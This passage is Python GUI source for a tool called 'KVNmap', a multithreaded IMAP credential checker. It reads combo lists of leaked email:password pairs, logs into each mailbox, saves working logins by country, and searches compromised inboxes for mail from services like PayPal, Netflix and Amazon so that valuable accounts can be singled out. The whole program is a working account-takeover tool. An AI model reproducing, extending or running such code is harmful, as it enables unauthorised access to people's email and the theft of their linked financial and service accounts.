            ("[W]", "Countries", DarkNeonTheme.NEON_YELLOW)
        ]
        
        self.stats = {}
        
        for icon, label, color in stats_config:
            card = NeonStatsCard(
                stats_frame,
                icon,
                label,
                color,
                width=120,
                height=70,
                relief=tk.FLAT
            )
            card.pack(side=tk.LEFT, expand=True, fill=tk.X, padx=3, pady=3)
            
            key = label.lower()
            if key == "countries":
                key = "countries"
            self.stats[key] = card.value_label
    
    def create_controls(self, parent):
        controls_frame = tk.Frame(parent, bg=DarkNeonTheme.BG_MAIN)
        controls_frame.pack(fill=tk.X, pady=(0, 10))
        
        row1 = tk.Frame(controls_frame, bg=DarkNeonTheme.BG_MAIN)
        row1.pack(fill=tk.X, pady=3)
        
        tk.Label(
            row1,
            text="> THREADS",
            font=("Consolas", 10, "bold"),
            fg=DarkNeonTheme.TEXT_SECONDARY,
            bg=DarkNeonTheme.BG_MAIN
        ).pack(side=tk.LEFT, padx=5)
        
        self.thread_var = tk.StringVar(value="100")
        thread_spin = tk.Spinbox(
            row1,
            from_=1,
            to=500,
            textvariable=self.thread_var,
            width=6,
            bg=DarkNeonTheme.BG_INPUT,
            fg=DarkNeonTheme.TEXT_PRIMARY,
            font=("Consolas", 10),
            relief=tk.FLAT,
            bd=0,
            highlightthickness=2,
            highlightcolor=DarkNeonTheme.NEON_GREEN,
            highlightbackground=DarkNeonTheme.BG_SECONDARY,
            buttonbackground=DarkNeonTheme.BG_SECONDARY,
            readonlybackground=DarkNeonTheme.BG_INPUT
        )
        thread_spin.pack(side=tk.LEFT, padx=5)
        
        tk.Label(
            row1,
            text="> COMBO",
            font=("Consolas", 10, "bold"),
            fg=DarkNeonTheme.TEXT_SECONDARY,
            bg=DarkNeonTheme.BG_MAIN
        ).pack(side=tk.LEFT, padx=(15, 5))
        
        self.combo_entry = NeonEntry(
            row1,
            width=35
        )
        self.combo_entry.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
        self.combo_entry.insert(0, "combo.txt")
        
        load_btn = NeonButton(
            row1,
            text="[LOAD]",
            color=DarkNeonTheme.NEON_BLUE,
            command=self.load_combo_file
        )
        load_btn.pack(side=tk.LEFT, padx=3)
        
        self.start_btn = NeonButton(
            row1,
            text="[START]",
            color=DarkNeonTheme.NEON_GREEN,
            command=self.toggle_check,
            font=("Consolas", 11, "bold")
        )
        self.start_btn.pack(side=tk.RIGHT, padx=3)
        
        row2 = tk.Frame(controls_frame, bg=DarkNeonTheme.BG_MAIN)
        row2.pack(fill=tk.X, pady=3)
        
        self.keyword_mode_var = tk.BooleanVar(value=True)
        mode_check = tk.Checkbutton(
            row2,
            text="KEYWORD MODE",
            variable=self.keyword_mode_var,
            fg=DarkNeonTheme.TEXT_SECONDARY,
            bg=DarkNeonTheme.BG_MAIN,
            selectcolor=DarkNeonTheme.BG_MAIN,
            font=("Consolas", 9, "bold"),
            activebackground=DarkNeonTheme.BG_MAIN,
            activeforeground=DarkNeonTheme.NEON_GREEN,
            relief=tk.FLAT,
            bd=0,
            highlightthickness=0
        )
        mode_check.pack(side=tk.LEFT, padx=5)
        
        self.keyword_entry = NeonEntry(
            row2,
            width=20
        )
        self.keyword_entry.pack(side=tk.LEFT, padx=5)
        self.keyword_entry.bind("<Return>", lambda e: self.add_keyword())
        
        add_btn = NeonButton(
            row2,
            text="[ADD]",
            color=DarkNeonTheme.NEON_GREEN,
            command=self.add_keyword
        )
        add_btn.pack(side=tk.LEFT, padx=2)
        
        import_btn = NeonButton(
            row2,
            text="[IMPORT]",
            color=DarkNeonTheme.NEON_PURPLE,
            command=self.import_keywords_from_file
        )
        import_btn.pack(side=tk.LEFT, padx=2)
        
        clear_kw_btn = NeonButton(
            row2,
            text="[CLEAR]",
            color=DarkNeonTheme.NEON_RED,
            command=self.clear_all_keywords
        )
        clear_kw_btn.pack(side=tk.LEFT, padx=2)
        
        self.keyword_tags_frame = tk.Frame(row2, bg=DarkNeonTheme.BG_MAIN)
        self.keyword_tags_frame.pack(side=tk.LEFT, padx=10, fill=tk.X, expand=True)
        
        action_frame = tk.Frame(row2, bg=DarkNeonTheme.BG_MAIN)
        action_frame.pack(side=tk.RIGHT)
        
        export_btn = NeonButton(
            action_frame,
            text="[EXPORT]",
            color=DarkNeonTheme.NEON_ORANGE,
            command=self.export_results
        )
        export_btn.pack(side=tk.LEFT, padx=2)
        
        open_btn = NeonButton(
            action_frame,
            text="[FOLDER]",
            color=DarkNeonTheme.NEON_YELLOW,
            command=self.open_results_folder
        )
        open_btn.pack(side=tk.LEFT, padx=2)
        
        clear_log_btn = NeonButton(
            action_frame,
            text="[CLR LOG]",
            color=DarkNeonTheme.NEON_RED,
            command=self.clear_log
        )
        clear_log_btn.pack(side=tk.LEFT, padx=2)
        
        self.add_sample_keywords()
    
    def clear_all_keywords(self):
        if hasattr(self, 'keyword_tags'):
            for keyword in self.keyword_tags.copy():
                self.remove_keyword_tag(keyword)
            self.log("> All keywords cleared\n", "info")
    
    def import_keywords_from_file(self):
        file_path = filedialog.askopenfilename(
            title="Select Keyword File",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        if file_path:
            try:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    keywords = [line.strip() for line in f if line.strip()]
                
                if not keywords:
                    self.log("> No keywords found in file\n", "warning")
                    return
                
                added = 0
                for kw in keywords:
                    if kw not in self.keyword_tags:
                        self.add_keyword_tag(kw)
                        added += 1
                
                self.log(f"> Imported {added} keywords from {os.path.basename(file_path)}\n", "success")
                if len(keywords) > 5:
                    self.log(f"> Keywords: {', '.join(keywords[:5])}...\n", "info")
                else:
                    self.log(f"> Keywords: {', '.join(keywords)}\n", "info")
                
            except Exception as e:
                self.log(f"> Error importing keywords: {str(e)}\n", "error")
    
    def add_sample_keywords(self):
        if not hasattr(self, 'keyword_tags'):
            self.keyword_tags = []
            self.keyword_buttons = {}
        sample = ["Spotify", "Netflix", "Amazon", "PayPal", "Apple"]
        for kw in sample:
            self.add_keyword_tag(kw)
    
    def add_keyword_tag(self, keyword):
        if not hasattr(self, 'keyword_tags'):
            self.keyword_tags = []
            self.keyword_buttons = {}
        
        if keyword in self.keyword_tags:
            return
        
        self.keyword_tags.append(keyword)
        
        tag_frame = tk.Frame(self.keyword_tags_frame, bg=DarkNeonTheme.BG_SECONDARY)
        tag_frame.pack(side=tk.LEFT, padx=2)
        
        tag = tk.Button(
            tag_frame,
            text=f" {keyword} ",
            bg=DarkNeonTheme.BG_SECONDARY,
            fg=DarkNeonTheme.NEON_GREEN,
            font=("Consolas", 8, "bold"),
            relief=tk.FLAT,
            bd=0,
            padx=6,
            pady=2,
            cursor="hand2"
        )
        tag.pack(side=tk.LEFT)
        
        close_btn = tk.Button(
            tag_frame,
            text="×",
            bg=DarkNeonTheme.BG_SECONDARY,
            fg=DarkNeonTheme.TEXT_MUTED,
            font=("Consolas", 10, "bold"),
            relief=tk.FLAT,
            bd=0,
            padx=4,
            pady=2,
            cursor="hand2",
            command=lambda k=keyword: self.remove_keyword_tag(k)
        )
        close_btn.pack(side=tk.LEFT)
        
        def on_enter(e):
            tag.config(bg=DarkNeonTheme.BG_HOVER)
            close_btn.config(bg=DarkNeonTheme.BG_HOVER)
            tag_frame.config(bg=DarkNeonTheme.BG_HOVER)
        
        def on_leave(e):
            tag.config(bg=DarkNeonTheme.BG_SECONDARY)
            close_btn.config(bg=DarkNeonTheme.BG_SECONDARY)
            tag_frame.config(bg=DarkNeonTheme.BG_SECONDARY)
        
        tag.bind("<Enter>", on_enter)
        tag.bind("<Leave>", on_leave)
        close_btn.bind("<Enter>", on_enter)
        close_btn.bind("<Leave>", on_leave)
        tag_frame.bind("<Enter>", on_enter)
        tag_frame.bind("<Leave>", on_leave)
        
        self.keyword_buttons[keyword] = tag_frame
        self.update_keyword_count()
    
    def remove_keyword_tag(self, keyword):
        if keyword in self.keyword_tags:
            self.keyword_tags.remove(keyword)
            if keyword in self.keyword_buttons:
                self.keyword_buttons[keyword].destroy()
                del self.keyword_buttons[keyword]
            self.update_keyword_count()
    
    def add_keyword(self):
        keyword = self.keyword_entry.get().strip()
        if keyword and keyword not in self.keyword_tags:
            self.add_keyword_tag(keyword)
            self.keyword_entry.delete(0, tk.END)
            self.log(f"> Added keyword: {keyword}\n", "info")
    
    def update_keyword_count(self):
        count = len(self.keyword_tags) if hasattr(self, 'keyword_tags') else 0
        if "keywords" in self.stats:
            self.stats["keywords"].config(text=str(count))
    
    def get_keywords(self):
        return self.keyword_tags.copy() if hasattr(self, 'keyword_tags') else []
    
    def create_log(self, parent):
        log_frame = tk.Frame(parent, bg=DarkNeonTheme.BG_MAIN)
        log_frame.pack(fill=tk.BOTH, expand=True, pady=(5, 0))
        
        log_header = tk.Frame(log_frame, bg=DarkNeonTheme.BG_SECONDARY, height=30)
        log_header.pack(fill=tk.X, padx=2, pady=(0, 3))
        log_header.pack_propagate(False)
        
        log_header_inner = tk.Frame(log_header, bg=DarkNeonTheme.BG_SECONDARY)
        log_header_inner.pack(fill=tk.BOTH, padx=10)
        
        tk.Label(
            log_header_inner,
            text="> LIVE_LOG",
            font=("Consolas", 11, "bold"),
            fg=DarkNeonTheme.NEON_GREEN,
            bg=DarkNeonTheme.BG_SECONDARY
        ).pack(side=tk.LEFT)
        
        self.log_stats = tk.Label(
            log_header_inner,
            text="",
            font=("Consolas", 9),
            fg=DarkNeonTheme.TEXT_MUTED,
            bg=DarkNeonTheme.BG_SECONDARY
        )
        self.log_stats.pack(side=tk.LEFT, padx=15)
        
        search_frame = tk.Frame(log_header_inner, bg=DarkNeonTheme.BG_SECONDARY)
        search_frame.pack(side=tk.RIGHT)
        
        tk.Label(
            search_frame,
            text=">",
            font=("Consolas", 10, "bold"),
            fg=DarkNeonTheme.TEXT_MUTED,
            bg=DarkNeonTheme.BG_SECONDARY
        ).pack(side=tk.LEFT)
        
        self.search_entry = tk.Entry(
            search_frame,
            width=15,
            bg=DarkNeonTheme.BG_INPUT,
            fg=DarkNeonTheme.TEXT_PRIMARY,
            font=("Consolas", 9),
            relief=tk.FLAT,
            bd=0,
            insertbackground=DarkNeonTheme.NEON_GREEN,
            highlightthickness=1,
            highlightcolor=DarkNeonTheme.NEON_GREEN,
            highlightbackground=DarkNeonTheme.BG_SECONDARY
        )
        self.search_entry.pack(side=tk.LEFT, padx=5)
        self.search_entry.bind("<KeyRelease>", self.search_log)
        
        log_text_frame = tk.Frame(log_frame, bg=DarkNeonTheme.BG_INPUT)
        log_text_frame.pack(fill=tk.BOTH, expand=True, padx=2)
        
        self.log_area = scrolledtext.ScrolledText(
            log_text_frame,
            bg=DarkNeonTheme.BG_INPUT,
            fg=DarkNeonTheme.TEXT_PRIMARY,
            font=("Consolas", 10),
            relief=tk.FLAT,
            bd=0,
            wrap=tk.WORD,
            highlightthickness=1,
            highlightcolor=DarkNeonTheme.NEON_GREEN,
            highlightbackground=DarkNeonTheme.BG_SECONDARY
        )
        self.log_area.place(relx=0, rely=0, relwidth=1, relheight=1)
        
        self.log_area.tag_configure("success", foreground=DarkNeonTheme.NEON_GREEN)
        self.log_area.tag_configure("error", foreground=DarkNeonTheme.NEON_RED)
        self.log_area.tag_configure("warning", foreground=DarkNeonTheme.NEON_ORANGE)
        self.log_area.tag_configure("info", foreground=DarkNeonTheme.NEON_BLUE)
        self.log_area.tag_configure("keyword_found", foreground=DarkNeonTheme.NEON_PINK, font=("Consolas", 10, "bold"))
        self.log_area.tag_configure("title", foreground=DarkNeonTheme.NEON_GREEN, font=("Consolas", 11, "bold"))
        self.log_area.tag_configure("highlight", background=DarkNeonTheme.NEON_YELLOW, foreground=DarkNeonTheme.BG_MAIN)
    
    def create_footer(self, parent):
        footer = tk.Frame(parent, bg=DarkNeonTheme.BG_MAIN)
        footer.pack(fill=tk.X, pady=(8, 0))
        
        tk.Label(
            footer,
            text="KVNmap v5.0 | @zgoverment",
            font=("Consolas", 9),
            fg=DarkNeonTheme.TEXT_MUTED,
            bg=DarkNeonTheme.BG_MAIN
        ).pack(side=tk.LEFT)
        
        tk.Label(
            footer,
            text=f"{len(IMAP_SERVERS):,} PROVIDERS",
            font=("Consolas", 9),
            fg=DarkNeonTheme.TEXT_MUTED,
            bg=DarkNeonTheme.BG_MAIN
        ).pack(side=tk.RIGHT)
    
    def search_log(self, event=None):
        search_term = self.search_entry.get().lower()
        self.log_area.tag_remove("highlight", 1.0, tk.END)
        if not search_term:
            return
        
        start_pos = 1.0
        while True:
            start_pos = self.log_area.search(search_term, start_pos, tk.END, nocase=True)
            if not start_pos:
                break
            end_pos = f"{start_pos}+{len(search_term)}c"
            self.log_area.tag_add("highlight", start_pos, end_pos)
            start_pos = end_pos
    
    def load_combo_file(self):
        file_path = filedialog.askopenfilename(
            title="Select Combo File",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        if file_path:
            self.combo_entry.delete(0, tk.END)
            self.combo_entry.insert(0, file_path)
            self.log(f"> Loaded: {os.path.basename(file_path)}\n", "info")
            try:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    lines = f.readlines()
                self.log(f"> {len(lines):,} lines\n", "info")
            except Exception as e:
                self.log(f"> Error: {str(e)}\n", "error")
    
    def export_results(self):
        try:
            files = []
            folders = ['kvnResults', 'keywordHits']
            for folder in folders:
                if os.path.exists(folder):
                    for root, dirs, filenames in os.walk(folder):
                        for f in filenames:
                            if f.endswith('.txt'):
                                files.append(os.path.join(root, f))
            
            if files:
                self.log(f"> Exported {len(files)} result files\n", "success")
                for f in files[:10]:
                    size = os.path.getsize(f)
                    size_str = f"{size} B" if size < 1024 else f"{size/1024:.1f} KB"
                    self.log(f"   > {f} ({size_str})\n", "info")
                if len(files) > 10:
                    self.log(f"   > ... and {len(files)-10} more files\n", "info")
            else:
                self.log("> No results\n", "warning")
        except Exception as e:
            self.log(f"> Error: {str(e)}\n", "error")
    
    def open_results_folder(self):
        try:
            if os.path.exists('kvnResults'):
                if os.name == 'nt':
                    os.startfile('kvnResults')
                elif os.name == 'posix':
                    os.system(f'open "kvnResults"' if sys.platform == 'darwin' else f'xdg-open "kvnResults"')
                self.log("> Opened results folder\n", "info")
            else:
                self.log("> Results folder not found\n", "warning")
        except Exception as e:
            self.log(f"> Error: {str(e)}\n", "error")
    
    def clear_log(self):
        self.log_area.delete(1.0, tk.END)
        self.log("> Log cleared\n", "info")
    
    def setup_worker(self):
        self.worker_running = True
        self.worker_thread = threading.Thread(target=self.process_queue, daemon=True)
        self.worker_thread.start()
    
    def process_queue(self):
        while self.worker_running:
            try:
                msg, tag = self.log_queue.get(timeout=1)
                if msg:
                    self.log_area.insert(tk.END, msg, tag)
                    self.log_area.see(tk.END)
                    lines = int(self.log_area.index('end-1c').split('.')[0])
                    self.root.after(0, lambda: self.log_stats.config(text=f"{lines} lines"))
            except queue.Empty:
                continue
            except:
                break
    
    def log(self, message, tag=""):
        timestamp = datetime.now().strftime("%H:%M:%S")
        msg = f"[{timestamp}] {message}"
        self.log_queue.put((msg, tag))
    
    def toggle_check(self):
        if not self.is_running:
            self.start_check()
        else:
            self.stop_check()
    
    def start_check(self):
        combo_file = self.combo_entry.get().strip()
        self.keywords = self.get_keywords()
        
        if not combo_file or not os.path.exists(combo_file):
            messagebox.showerror("Error", "Combo file not found!")
            return
        
        if self.keyword_mode_var.get() and not self.keywords:
            messagebox.showerror("Error", "Please add keywords!")
            return
        
        try:
            with open(combo_file, 'r', encoding='utf-8', errors='ignore') as f:
                self.combo_list = [line.strip() for line in f if line.strip()]
            
            self.total_combos = len(self.combo_list)
            self.checked_combos = 0
            self.valid_combos = 0
            self.invalid_combos = 0
            self.found_combos = 0
            self.start_time = time.time()
            self.should_stop = False
            self.found_keywords = set()
            self.keyword_counts = {kw: 0 for kw in self.keywords}
            self.country_counts = {}
            
            self.update_stats()
            self.is_running = True
            self.start_btn.config(text="[STOP]", fg=DarkNeonTheme.NEON_RED, bg=DarkNeonTheme.BG_SECONDARY)
            self.status_indicator.config(text="● RUNNING", fg=DarkNeonTheme.NEON_ORANGE)
            
            self.log_area.delete(1.0, tk.END)
            self.log("═" * 70 + "\n", "title")
            self.log("> CHECK STARTED\n", "title")
            self.log(f"> File: {os.path.basename(combo_file)}\n", "info")
            self.log(f"> Total: {self.total_combos:,}\n", "info")
            self.log(f"> Threads: {self.thread_var.get()}\n", "info")
            if self.keyword_mode_var.get() and self.keywords:
                self.log(f"> Keywords: {', '.join(self.keywords)}\n", "info")
            self.log("> Results: kvnResults/[Country]/valid.txt\n", "info")
            self.log("> Keyword Hits: keywordHits/[Keyword]/hits.txt\n", "info")
            self.log("═" * 70 + "\n\n", "title")
            
            max_workers = min(int(self.thread_var.get()), 500)
            self.thread_pool = concurrent.futures.ThreadPoolExecutor(max_workers=max_workers)
            
            for combo in self.combo_list:
                if self.should_stop:
                    break
                self.thread_pool.submit(self.check_imap, combo)
            
            monitor = threading.Thread(target=self.monitor_completion, daemon=True)
            monitor.start()
            
        except Exception as e:
            self.log(f"> Error: {str(e)}\n", "error")
            self.is_running = False
            self.start_btn.config(text="[START]", fg=DarkNeonTheme.NEON_GREEN, bg=DarkNeonTheme.BG_SECONDARY)
            self.status_indicator.config(text="● ERROR", fg=DarkNeonTheme.NEON_RED)
    
    def stop_check(self):
        self.should_stop = True
        self.is_running = False
        if self.thread_pool:
            self.thread_pool.shutdown(wait=False)
        self.start_btn.config(text="[START]", fg=DarkNeonTheme.NEON_GREEN, bg=DarkNeonTheme.BG_SECONDARY)
        self.status_indicator.config(text="● STOPPED", fg=DarkNeonTheme.NEON_RED)
        self.log("> STOPPED\n", "warning")
    
    def monitor_completion(self):
        while self.is_running and not self.should_stop:
            time.sleep(0.5)
        
        if self.thread_pool:
            self.thread_pool.shutdown(wait=True)
        
        if not self.should_stop:
            elapsed = time.time() - self.start_time
            self.log("\n" + "═" * 70 + "\n", "title")
            self.log("> COMPLETED\n", "success")
            self.log(f"> Time: {elapsed:.2f}s\n", "info")
            self.log(f"> Total: {self.total_combos:,}\n", "info")
            self.log(f"> Checked: {self.checked_combos:,}\n", "info")
            self.log(f"> Valid: {self.valid_combos:,}\n", "success")
            self.log(f"> Invalid: {self.invalid_combos:,}\n", "error")
            
            if self.keyword_mode_var.get() and self.keyword_counts:
                self.log(f"> Found (Keyword Matches): {self.found_combos:,}\n", "success")
                self.log("\n> Keyword Breakdown:\n", "title")
                for kw, count in sorted(self.keyword_counts.items(), key=lambda x: x[1], reverse=True):
                    if count > 0:
                        self.log(f"   > {kw}: {count}\n", "keyword_found")
            
            if self.country_counts:
                self.log("\n> Country Breakdown:\n", "title")
                for country, count in sorted(self.country_counts.items(), key=lambda x: x[1], reverse=True):
                    self.log(f"   > {country}: {count}\n", "info")
            
            self.log("\n> Result Files:\n", "title")
            for folder in ['kvnResults', 'keywordHits']:
                if os.path.exists(folder):
                    files = []
                    for root, dirs, filenames in os.walk(folder):
                        for f in filenames:
                            if f.endswith('.txt'):
                                files.append(os.path.join(root, f))
                    if files:
                        self.log(f"   > {folder}/ ({len(files)} files)\n", "info")
            
            self.log("═" * 70 + "\n", "title")
            self.start_btn.config(text="[START]", fg=DarkNeonTheme.NEON_GREEN, bg=DarkNeonTheme.BG_SECONDARY)
            self.status_indicator.config(text="● READY", fg=DarkNeonTheme.NEON_GREEN)
    
    def check_imap(self, combo):
        if self.should_stop or not self.is_running:
            return
        
        if ":" not in combo:
            self.update_checked()
            self.increment_invalid()
            return
        
        email, password = combo.split(":", 1)
        email = email.strip()
        password = password.strip()
        
        if not email or not password:
            self.update_checked()
            self.increment_invalid()
            return
        
        imap_server = get_imap_server(email)
        if not imap_server:
            self.update_checked()
            self.increment_invalid()
            return
        
        try:
            socket.setdefaulttimeout(15)
            mail = imaplib.IMAP4_SSL(imap_server)
            
            try:
                mail.login(email, password)
            except imaplib.IMAP4.error:
                self.update_checked()
                self.increment_invalid()
                return
            
            self.save_valid_to_country(email, password)
            
            with threading.Lock():
                self.valid_combos += 1
                self.update_stats()
            
            if self.keyword_mode_var.get() and self.keywords:
                try:
                    mail.select("INBOX")
                    found_keywords = []
                    for keyword in self.keywords:
                        try:
                            typ, data = mail.search(None, f'FROM "{keyword}"')
                            if typ == "OK" and data[0]:
                                total = len(data[0].split())
                                if total > 0:
                                    found_keywords.append(keyword)
                                    self.save_keyword_hit(email, password, keyword)
                                    self.log(f"> FOUND | {email} | {keyword} ({total})\n", "keyword_found")
                        except:
                            continue
                    
                    if found_keywords:
                        with threading.Lock():
                            self.found_combos += 1
                            self.update_stats()
                    else:
                        self.log(f"> VALID | {email}\n", "success")
                except:
                    self.log(f"> VALID | {email}\n", "success")
            else:
                with threading.Lock():
                    self.found_combos += 1
                    self.update_stats()
                self.log(f"> VALID | {email}\n", "success")
            
            mail.logout()
            self.update_checked()
            time.sleep(0.05)
            
        except Exception:
            self.update_checked()
            self.increment_invalid()
    
    def increment_invalid(self):
        with threading.Lock():
            self.invalid_combos += 1
        self.root.after(0, self.update_stats)
    
    def update_checked(self):
        with threading.Lock():
            self.checked_combos += 1
        self.root.after(0, self.update_stats)
    
    def update_stats(self):
        if "total" in self.stats:
            self.stats["total"].config(text=f"{self.total_combos:,}")
        if "checked" in self.stats:
            self.stats["checked"].config(text=f"{self.checked_combos:,}")
        if "valid" in self.stats:
            self.stats["valid"].config(text=f"{self.valid_combos:,}")
        if "invalid" in self.stats:
            self.stats["invalid"].config(text=f"{self.invalid_combos:,}")
        if "found" in self.stats:
            self.stats["found"].config(text=f"{self.found_combos:,}")
        if "countries" in self.stats:
            self.stats["countries"].config(text=str(len(self.country_counts)))
        
        elapsed = time.time() - self.start_time
        if elapsed > 0 and self.checked_combos > 0:
            cpm = int((self.checked_combos / elapsed) * 60)
        else:
            cpm = 0
        if "cpm" in self.stats:
            self.stats["cpm"].config(text=f"{cpm:,}")
    
    def on_closing(self):
        self.worker_running = False
        self.should_stop = True
        self.is_running = False
        if self.thread_pool:
            self.thread_pool.shutdown(wait=False)
        self.root.destroy()

def main():
    root = tk.Tk()
    app = KVNmap(root)
    root.mainloop()

if __name__ == "__main__":
    main()